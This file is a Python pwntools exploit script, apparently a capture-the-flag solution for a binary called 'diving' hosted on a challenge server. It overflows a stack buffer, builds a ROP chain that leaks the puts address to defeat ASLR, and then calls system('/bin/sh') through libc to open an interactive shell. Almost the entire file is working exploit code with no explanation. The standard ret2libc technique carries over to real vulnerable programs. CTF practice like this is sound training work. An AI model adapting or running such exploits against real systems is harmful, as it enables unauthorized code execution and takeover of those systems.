#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF('./diving', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

context.log_level = 'info'

host = 'challenges.cybersecuritychallenge.pt'
port = 24101

pop_rdi = 0x401273  # pop rdi ; ret

def exploit(io):
    # 16 bytes fill + 8 null bytes (clobber saved RBP cleanly) + ROP
    payload  = b'A' * 16 + b'\x00' * 8
    payload += p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.sym['main'])

    io.recvuntil(b'> ')
    io.sendline(payload)
    io.recvuntil(b'\n')

    PUTS = u64(io.recv(6).ljust(8, b'\x00'))
    log.success(f'puts leak  : {hex(PUTS)}')

    libc.address = PUTS - libc.sym['puts']
    log.success(f'libc base  : {hex(libc.address)}')


    ret    = 0x40101a
    binsh  = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    payload2  = b'A' * 16 + b'\x00' * 8
    payload2 += p64(ret)
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    io.recvuntil(b'> ')
    io.sendline(payload2)

    io.interactive()


if __name__ == '__main__':
    if args.LOCAL:
        io = process('./diving')
    else:
        io = remote(host, port)

    exploit(io)
